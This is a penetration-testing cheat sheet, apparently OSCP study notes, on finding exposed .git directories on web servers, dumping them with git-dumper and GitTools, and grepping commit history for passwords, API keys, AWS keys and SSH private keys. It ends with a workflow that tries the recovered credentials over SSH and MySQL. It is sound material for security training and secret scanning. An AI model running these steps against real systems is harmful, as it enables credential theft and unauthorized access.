# GitHub Reconnaissance

tags: #Reconnaissance #GitHub #OSINT #Foundational

resources: [git-dumper](https://github.com/arthaud/git-dumper), [HackTricks GitHub](https://book.hacktricks.xyz/generic-methodologies-and-resources/external-recon-methodology/github-leaked-secrets)

> [!info] If you find `.git` directories exposed on web servers or need to analyze Git repositories, these techniques help extract sensitive information.

## Finding .git Directories

### Web Server Discovery

```bash
# Check if .git is exposed
curl http://<TargetIP>/.git/
curl http://<TargetIP>/.git/config
curl http://<TargetIP>/.git/HEAD
```

### Common Locations

```plaintext
http://<target>/.git/
http://<target>/.git/config
http://<target>/.git/HEAD
http://<target>/.git/logs/HEAD
http://<target>/.git/index
```

### Directory Fuzzing

```bash
# Using ffuf
ffuf -u http://<TargetIP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -mc 200,301,302,403

# Using gobuster
gobuster dir -u http://<TargetIP> -w /usr/share/wordlists/dirb/common.txt -x git
```

## Downloading Exposed .git Repositories

### Using git-dumper

```bash
# Install
pip3 install git-dumper
```

```bash
# Download entire repository
git-dumper http://<TargetIP>/.git/ /path/to/output
```

```bash
# Example
git-dumper http://10.10.10.5/.git/ ./git-dump
```

> [!tip] git-dumper reconstructs the repository even if directory listing is disabled.

### Manual Download

```bash
# Create directory
mkdir git-repo
cd git-repo

# Download .git directory
wget -r -np -R "index.html*" http://<TargetIP>/.git/
```

## Analyzing Git Repository

### View Commit History

```bash
cd git-dump
git log
```

```bash
# Detailed log with file changes
git log --stat
```

```bash
# One-line format
git log --oneline
```

### Example Output

```plaintext
commit a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0
Author: admin <admin@company.com>
Date:   Mon Jan 15 10:30:00 2024 +0000

    Added database credentials
```

### View Specific Commit

```bash
git show <commit-id>
```

```bash
# Example
git show a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0
```

> [!info] This displays the commit information and newly added content.

### Example Output

```diff
commit a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0
Author: admin <admin@company.com>
Date:   Mon Jan 15 10:30:00 2024 +0000

    Added database credentials

diff --git a/config.php b/config.php
+++ b/config.php
@@ -1,3 +1,6 @@
+$db_host = "localhost";
+$db_user = "admin";
+$db_pass = "SuperSecretPassword123!";
```

### Search Commit Messages

```bash
# Search for specific keywords
git log --grep="password"
git log --grep="credential"
git log --grep="secret"
git log --grep="api"
git log --grep="key"
```

### View All Branches

```bash
git branch -a
```

```bash
# Checkout different branch
git checkout <branch-name>
```

### View File at Specific Commit

```bash
git show <commit-id>:<file-path>
```

```bash
# Example
git show a1b2c3d4:config.php
```

## Searching for Sensitive Information

### Search All Commits for Passwords

```bash
# Search commit diffs
git log -p | grep -i "password"
git log -p | grep -i "secret"
git log -p | grep -i "api_key"
git log -p | grep -i "token"
```

### Search File Contents

```bash
# Search current files
grep -r "password" .
grep -r "api_key" .
grep -r "secret" .
```

### Search Git History

```bash
# Search all commits for specific string
git rev-list --all | xargs git grep "password"
git rev-list --all | xargs git grep "api_key"
```

### Find Deleted Files

```bash
# List all deleted files
git log --diff-filter=D --summary
```

```bash
# Restore deleted file
git checkout <commit-id>^ -- <file-path>
```

## Common Sensitive Files

### Configuration Files

```bash
# Search for config files
find . -name "*.config"
find . -name "config.*"
find . -name ".env"
find . -name "settings.*"
```

### Database Files

```bash
find . -name "database.yml"
find . -name "db.config"
find . -name "*.sql"
```

### Credential Files

```bash
find . -name "credentials.*"
find . -name "secrets.*"
find . -name ".htpasswd"
```

### SSH Keys

```bash
find . -name "id_rsa"
find . -name "id_dsa"
find . -name "*.pem"
find . -name "*.key"
```

## Complete Workflow Example

### Step 1: Discover .git Directory

```bash
curl http://10.10.10.5/.git/config
```

### Step 2: Download Repository

```bash
git-dumper http://10.10.10.5/.git/ ./git-dump
cd git-dump
```

### Step 3: View Commit History

```bash
git log --oneline
```

```plaintext
a1b2c3d Added database credentials
e4f5g6h Updated API keys
i7j8k9l Initial commit
```

### Step 4: Examine Suspicious Commit

```bash
git show a1b2c3d
```

```diff
+$db_user = "admin";
+$db_pass = "SuperSecretPassword123!";
```

### Step 5: Search for More Secrets

```bash
git log -p | grep -i "password"
git log -p | grep -i "api"
```

### Step 6: Extract Credentials

```plaintext
Found credentials:
- Database: admin:SuperSecretPassword123!
- API Key: sk_live_abc123def456
- SSH Key: /home/admin/.ssh/id_rsa
```

### Step 7: Test Credentials

```bash
# Try SSH
ssh admin@10.10.10.5
# Password: SuperSecretPassword123!

# Try database
mysql -h 10.10.10.5 -u admin -p
# Password: SuperSecretPassword123!
```

## GitHub Dorking (External Recon)

> [!warning] This section is for external GitHub reconnaissance, not typically relevant for OSCP exam.

### Search Operators

```plaintext
# Organization repositories
org:<organization-name>

# Specific filename
filename:config.php

# File extension
extension:env

# Code content
"password" extension:php

# Specific user
user:<username>
```

### Example Searches

```plaintext
# Find .env files
org:company-name filename:.env

# Find database configs
org:company-name filename:database.yml

# Find API keys
org:company-name "api_key"

# Find passwords in code
org:company-name "password" extension:php
```

### Using GitHub CLI

```bash
# Install gh
sudo apt install gh

# Search code
gh search code "password" --repo company/repo
```

## Automated Tools

### GitTools

```bash
# Clone GitTools
git clone https://github.com/internetwache/GitTools.git
cd GitTools

# Dumper
./Dumper/gitdumper.sh http://<TargetIP>/.git/ /output/dir

# Extractor (extract commits)
./Extractor/extractor.sh /output/dir /extracted

# Finder (find .git directories)
./Finder/gitfinder.py -i targets.txt
```

### TruffleHog

```bash
# Install
pip3 install truffleHog

# Scan repository
trufflehog git file:///path/to/repo

# Scan remote repository
trufflehog git https://github.com/user/repo
```

### GitLeaks

```bash
# Install
wget https://github.com/gitleaks/gitleaks/releases/download/v8.18.0/gitleaks_8.18.0_linux_x64.tar.gz
tar -xzf gitleaks_8.18.0_linux_x64.tar.gz

# Scan repository
./gitleaks detect --source /path/to/repo

# Scan with verbose output
./gitleaks detect --source /path/to/repo -v
```

## Recovering Deleted Commits

### View Reflog

```bash
git reflog
```

### Restore Deleted Commit

```bash
git checkout <commit-id>
```

### Create Branch from Deleted Commit

```bash
git branch recovered-branch <commit-id>
git checkout recovered-branch
```

## Troubleshooting

### .git Directory Not Accessible

> [!tip] Try different paths:

```bash
curl http://<TargetIP>/.git/HEAD
curl http://<TargetIP>/.git/config
curl http://<TargetIP>/.git/logs/HEAD
```

### git-dumper Fails

```bash
# Try manual download
wget -r -np -R "index.html*" http://<TargetIP>/.git/

# Or use GitTools
./GitTools/Dumper/gitdumper.sh http://<TargetIP>/.git/ ./output
```

### Repository Appears Empty

```bash
# Check all branches
git branch -a

# Check reflog
git reflog

# List all objects
git rev-list --all
```

## Security Considerations

> [!important] Exposed .git directories often contain:
> - Database credentials
> - API keys and tokens
> - SSH private keys
> - Internal IP addresses
> - Email addresses
> - Source code with vulnerabilities
> - Deployment scripts

## OSCP Exam Tips

> [!warning] In OSCP exam:
> - .git directories are sometimes intentionally exposed
> - Look for credentials in commit history
> - Check for hardcoded passwords in old commits
> - Examine configuration files carefully

> [!tip] Quick workflow:
> 1. Check for `.git` directory (1 minute)
> 2. Download with git-dumper (2 minutes)
> 3. `git log` to view commits (1 minute)
> 4. `git show` on suspicious commits (2 minutes)
> 5. Search for "password", "secret", "api" (2 minutes)
> 6. Test found credentials (ongoing)

## Common Patterns to Search

```bash
# Passwords
git log -p | grep -E "(password|passwd|pwd)\s*=\s*['\"]"

# API Keys
git log -p | grep -E "(api_key|apikey|api-key)\s*=\s*['\"]"

# Tokens
git log -p | grep -E "(token|access_token)\s*=\s*['\"]"

# Database connections
git log -p | grep -E "(mysql|postgres|mongodb)://.*:.*@"

# AWS keys
git log -p | grep -E "AKIA[0-9A-Z]{16}"

# Private keys
git log -p | grep -E "BEGIN.*PRIVATE KEY"
```

## Resources

- [git-dumper](https://github.com/arthaud/git-dumper) - Download exposed .git repositories
- [GitTools](https://github.com/internetwache/GitTools) - Suite of Git exploitation tools
- [TruffleHog](https://github.com/trufflesecurity/truffleHog) - Find secrets in Git history
- [GitLeaks](https://github.com/gitleaks/gitleaks) - Scan for hardcoded secrets
- [HackTricks GitHub Secrets](https://book.hacktricks.xyz/generic-methodologies-and-resources/external-recon-methodology/github-leaked-secrets)
